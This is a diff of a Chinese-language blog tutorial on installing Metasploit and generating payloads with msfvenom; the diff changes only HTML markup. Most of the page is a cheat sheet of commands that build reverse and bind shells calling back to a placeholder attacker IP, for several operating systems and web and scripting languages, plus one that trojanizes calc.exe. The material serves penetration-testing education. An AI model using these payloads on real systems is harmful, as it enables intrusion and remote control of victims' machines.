@@ -446,7 +446,9 @@
         <p><img src="/images/fly.png" alt=""></p>
 <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Liunx下能够构造shell反弹脚本有很多常见的如bash，netcat、socat以及各种语言如果想具体了解的话可以看<a href="https://www.anquanke.com/post/id/87017" target="_blank" rel="noopener">这里</a>，当然今天主要内容是详细介绍msfvenom如何生成shell脚本。</p>
 <h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="metasploit-framework介绍"><a href="#metasploit-framework介绍" class="headerlink" title="metasploit-framework介绍"></a>metasploit-framework介绍</h3><p>Metasploit项目是一个旨在提供安全漏洞信息计算机安全项目，可以协助安全工程师进行渗透测试（penetration testing）及入侵检测系统签名开发。<br>Metasploit项目最为知名的子项目是开源的Metasploit框架，一套针对远程主机进行开发和执行“exploit代码”的工具。其他重要的子项目包括Opcode数据库、shellcode档案、安全研究等内容。<br>Metasploit项目知名的功能还包括反取证与规避工具，其中的某些工具已经内置在Metasploit Framework里面。–维基百科</p>
-<h3 id="如何安装metasploit-framework？"><a href="#如何安装metasploit-framework？" class="headerlink" title="如何安装metasploit-framework？"></a>如何安装metasploit-framework？</h3><p>在kali-Linux中有自带metasploit-framework<br>当然假如你已经有了一个基于 Debian 的 Linux 环境 如ubuntu<br>你可以通过以下命令下载<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstall &amp;&amp; \</span><br><span class="line">  chmod 755 msfinstall &amp;&amp; \</span><br><span class="line">  ./msfinstall</span><br></pre></td></tr></table></figure></p>
+<h3 id="如何安装metasploit-framework？"><a href="#如何安装metasploit-framework？" class="headerlink" title="如何安装metasploit-framework？"></a>如何安装metasploit-framework？</h3><p>在kali-Linux中有自带metasploit-framework<br>当然假如你已经有了一个基于 Debian 的 Linux 环境 如ubuntu<br>你可以通过以下命令下载</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstall &amp;&amp; \</span><br><span class="line">  chmod 755 msfinstall &amp;&amp; \</span><br><span class="line">  ./msfinstall</span><br></pre></td></tr></table></figure>
+
 <p>当然假如你是windows系统那么可以通过</p>
 <blockquote>
 <p><a href="https://windows.metasploit.com/metasploitframework-latest.msi" target="_blank" rel="noopener">https://windows.metasploit.com/metasploitframework-latest.msi</a></p>
@@ -477,7 +479,9 @@
 <blockquote>
 <p>msfvenom -l nops</p>
 </blockquote>
-<p>基础payload<br>命令格式<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p &lt;payload&gt; &lt;payload options&gt; -f &lt;format&gt; -o &lt;path&gt;</span><br></pre></td></tr></table></figure></p>
+<p>基础payload<br>命令格式</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p &lt;payload&gt; &lt;payload options&gt; -f &lt;format&gt; -o &lt;path&gt;</span><br></pre></td></tr></table></figure>
+
 <p>通常，这可能是您使用msfvenom的方式：</p>
 <blockquote>
 <p>./msfvenom -p windows/meterpreter/reverse_tcp lhost=[Attacker’s IP] lport=4444 -f exe -o /tmp/my_payload.exe</p>
@@ -497,21 +501,48 @@
 </blockquote>
 <h4 id="p"><a href="#p" class="headerlink" title="-p"></a>-p</h4><p>-p：指定要生成的有效负载</p>
 <p>Linux</p>
-<p>反向连接：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf &gt; shell.elf</span><br></pre></td></tr></table></figure></p>
-<p>正向连接：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x86/meterpreter/bind_tcp LHOST=&lt;Target IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf &gt; shell.elf</span><br></pre></td></tr></table></figure></p>
-<p>Windows<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f exe &gt; shell.ex</span><br></pre></td></tr></table></figure></p>
-<p>Mac<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f macho &gt; shell.macho</span><br><span class="line">Web Payloads</span><br></pre></td></tr></table></figure></p>
-<p>PHP<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.php</span><br><span class="line">cat shell.php | pbcopy &amp;&amp; echo &apos;&lt;?php &apos; | tr -d &apos;\n&apos; &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php</span><br></pre></td></tr></table></figure></p>
+<p>反向连接：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf &gt; shell.elf</span><br></pre></td></tr></table></figure>
+
+<p>正向连接：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x86/meterpreter/bind_tcp LHOST=&lt;Target IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf &gt; shell.elf</span><br></pre></td></tr></table></figure>
+
+<p>Windows</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f exe &gt; shell.ex</span><br></pre></td></tr></table></figure>
+
+<p>Mac</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f macho &gt; shell.macho</span><br><span class="line">Web Payloads</span><br></pre></td></tr></table></figure>
+
+<p>PHP</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.php</span><br><span class="line">cat shell.php | pbcopy &amp;&amp; echo &apos;&lt;?php &apos; | tr -d &apos;\n&apos; &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php</span><br></pre></td></tr></table></figure>
+
 <p>ASP</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f asp &gt; shell.asp</span><br></pre></td></tr></table></figure>
-<p>JSP<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.jsp</span><br></pre></td></tr></table></figure></p>
-<p>WAR<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f war &gt; shell.wa</span><br><span class="line">Scripting Payloads</span><br></pre></td></tr></table></figure></p>
-<p>Python<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_python LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.py</span><br></pre></td></tr></table></figure></p>
-<p>Bash<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_bash LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.sh</span><br></pre></td></tr></table></figure></p>
-<p>Perl<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_perl LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.pl</span><br></pre></td></tr></table></figure></p>
-<p>Linux Based Shellcode<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;</span><br></pre></td></tr></table></figure></p>
-<p>Windows Based Shellcode<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;</span><br></pre></td></tr></table></figure></p>
-<p>Mac Based Shellcode<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;</span><br><span class="line">Handlers</span><br></pre></td></tr></table></figure></p>
+
+<p>JSP</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.jsp</span><br></pre></td></tr></table></figure>
+
+<p>WAR</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f war &gt; shell.wa</span><br><span class="line">Scripting Payloads</span><br></pre></td></tr></table></figure>
+
+<p>Python</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_python LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.py</span><br></pre></td></tr></table></figure>
+
+<p>Bash</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_bash LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.sh</span><br></pre></td></tr></table></figure>
+
+<p>Perl</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_perl LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.pl</span><br></pre></td></tr></table></figure>
+
+<p>Linux Based Shellcode</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;</span><br></pre></td></tr></table></figure>
+
+<p>Windows Based Shellcode</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;</span><br></pre></td></tr></table></figure>
+
+<p>Mac Based Shellcode</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;</span><br><span class="line">Handlers</span><br></pre></td></tr></table></figure>
+
 <h4 id="自选模块"><a href="#自选模块" class="headerlink" title="自选模块"></a>自选模块</h4><p>生成执行计算器payload例子:</p>
 <blockquote>
 <p>   msfvenom -p windows/meterpreter/bind_tcp -x calc.exe -f exe &gt; 1.exe</p>
